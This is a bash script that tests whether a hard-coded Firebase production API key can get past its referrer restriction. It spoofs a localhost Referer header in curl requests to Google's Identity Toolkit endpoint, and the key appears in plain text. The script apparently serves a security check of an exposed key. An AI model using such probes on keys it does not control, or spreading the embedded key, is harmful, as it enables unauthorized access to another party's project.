#!/bin/bash

FIREBASE_PROD="AIzaSyAvB2MtJ-uw3ZcW66TeIYkUBL6vkQSlBik"

echo "---------------------------------------------------"
echo "🕵️  ADVANCED VERIFICATION: FIREBASE PROD"
echo "---------------------------------------------------"

echo ""
echo "1. Standard Request (No Referer) - Expected: 403"
CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=$FIREBASE_PROD" -H "Content-Type: application/json" -d '{"identifier":"test@example.com","continueUri":"http://localhost"}')
echo "Status: $CODE"

echo ""
echo "2. Spoofed Request (Referer: http://localhost:3000) - Expected: 200 (if exposed)"
# Attempting to bypass restriction by pretending to be the valid app
CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=$FIREBASE_PROD" -H "Content-Type: application/json" -H "Referer: http://localhost:3000" -d '{"identifier":"test@example.com","continueUri":"http://localhost"}')

if [ "$CODE" == "200" ]; then
    echo "🚨 RESULT: ACTIVE (200) - Restriction BYPASSED"
    echo "⚠️  The key works if the attacker simply adds a Referer header."
else
    echo "✅ RESULT: BLOCKED ($CODE)"
fi
